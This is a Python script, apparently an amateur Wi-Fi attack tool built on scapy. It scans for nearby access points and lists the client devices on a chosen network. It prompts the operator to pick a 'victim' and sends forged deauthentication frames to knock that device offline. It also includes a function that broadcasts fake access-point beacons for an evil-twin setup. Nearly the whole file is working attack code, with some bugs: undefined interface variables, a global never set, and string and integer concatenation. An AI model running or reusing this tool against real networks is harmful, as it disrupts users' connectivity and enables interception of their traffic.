hiddenSSIDs = dict()
# initialize the networks dataframe that will contain all access points nearby
import pandas
from scapy.all import *
# from threading import  thread
# initialize the networks dataframe that will contain all access points nearby
from scapy.layers.dot11 import Dot11Beacon

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID","BEACON","ROW"])
# set the index BSSID (MAC address of the AP)
# networks.set_index("BSSID", inplace=True)
list_users = []
wlan_name = ""


# set the index BSSID (MAC address of the AP)
# networks.set_index("BSSID", inplace=True)


def PacketHandler(packet):
    if packet.haslayer(Dot11Beacon):
        if packet.type == 0 and packet.subtype == 8:
            if packet.addr2 in networks["BSSID"].unique():
                x= networks[networks["BSSID"]==packet.addr2].iloc[0]
                x["BEACON"]=x["BEACON"]+4
                networks.loc[x["ROW"],"BEACON"]=int(x["BEACON"])+1
                # myBeacon[packet.addr2] = myBeacon[packet.addr2] + 1
            elif len(packet.info) > 0  :
                list1=[packet.addr2 ,packet.info.decode(),1,len(networks)]
                networks.loc[len(networks)]=list1


def searchUsers(packet):
    if packet.haslayer(Dot11):
        # print (packet.addr1 != packet.addr3)
        if ( packet.addr3==wlan_name)or packet.addr2==wlan_name or packet.addr1==wlan_name:
            if packet.addr1!= "ff:ff:ff:ff:ff:ff":
                print (packet.addr1,packet.addr2,packet.addr1)
                DS = packet.FCfield &0x3
                to_ds = DS & 0x1 != 0
                from_ds = DS & 0x2 != 0
                print (to_ds,from_ds)
                if to_ds and   packet.addr2 not in list_users:
                    list_users.append(packet.addr2)

def deauth(target_mac, gateway_mac, inter, count, loop, iface, verbose=1):
    print (target_mac)
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet,  count=121, iface=iface,loop=2)


def fake_AP(ssid, mac, infinite=True):
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
        # ESS+privacy to appear as secured on some devices
        beacon = Dot11Beacon(cap="ESS+privacy")
        essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
        frame = RadioTap() / dot11 / beacon / essid
        sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)

def change_channel():
    ch = 1
    while True:
        os.system("iwconfig " +interface+ "channel"+ ch)
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

def attack():
    # interface name, check using iwconfig
    interface = "mon0"
    # start sniffing
    # os.system(f"iwconfig {interface} channel ")
    # start the channel changer
    # channel_changer = Thread(target=change_channel)
    # channel_changer.daemon = True
    # channel_changer.start()
    sniff(prn=PacketHandler, iface=interface, timeout=10)
    print(networks)
    line = int(input("Choose line to attack"))
    wlan_name= networks.iloc[line]["BSSID"]
    # wlan_name=networks.loc(line)["BSSID"]
    print (wlan_name)
    # print(f'start search users from {wlan_name}')
    sniff(prn=searchUsers, iface=interface, timeout=30)
    # print(f'list of isers in {wlan_name}\n{list_users}\n choose your victim')
    print(list_users)
    victem = input("Choose user to attack")
    deauth(victem,wlan_name,0.1,1000,1,"mon0",1)
    # Thread(target=fake_AP, args=(ssid, mac)).start()







